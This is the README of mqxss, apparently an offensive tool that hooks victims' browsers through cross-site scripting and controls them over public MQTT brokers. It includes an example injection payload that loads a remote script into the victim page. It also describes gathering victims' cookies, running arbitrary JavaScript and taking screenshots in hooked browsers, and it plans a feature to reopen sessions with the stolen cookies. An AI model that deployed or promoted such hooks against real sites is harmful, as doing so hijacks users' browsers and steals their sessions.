# mqxss


**mqxss acts as a client to communicate with hooked browsers over MQTT**

![Screenshot from 2023-07-03 00-57-22](https://github.com/grampae/mqxss/assets/36344197/72bda6c6-7e27-4269-8bc3-19d7b171a76a)



I created this without a lot of bells and whistles so that the user could send raw JS to the hooked browser.  One might even consider this to be a poor mans BEeF as no server is required, you can use a public broker (however currently uses obfuscation, encryption is in the works).

Hooked browsers will communicate in the MQTT topic on the broker you specify, there are many public/free brokers to test this with.

Currently all that is needed is to set the desired MQTT broker, port and base topic within the x.js file and then connect to the same broker with the client.  The x.js file has the Paho MQTT JS library included within it.

Then send your XSS payload to the victim while the mqxss client is running, ex: '"><script src=https://example.com/x.js></script> or something similar, if vulnerable you should get a notification saying the browser has connected with some basic details including cookies etc.  Future version will generate JS payload so that you don't have to manually set it with broker information.
 
![a](https://github.com/grampae/mqxss/assets/36344197/20096c91-2e9e-4302-b5a9-e2edd665d382)

 
**Features:**

- **Currently only works with secure websockets however future version will supports mqtts as well.**
- **view hooked browsers**
- **view past hooked (unhooked) browsers**
- **send js to currently hooked browsers and get response if available**
- **pushover notification**
- **screenshot of hooked browser**

**Todo:**

- [ ] Encryption (currently just obfuscated)
- [ ] Set user , password  for brokers that require it at runtime
- [ ] Generate js payload at runtime to hook browsers with
- [ ] Open browser with hooked browser cookies for convenience
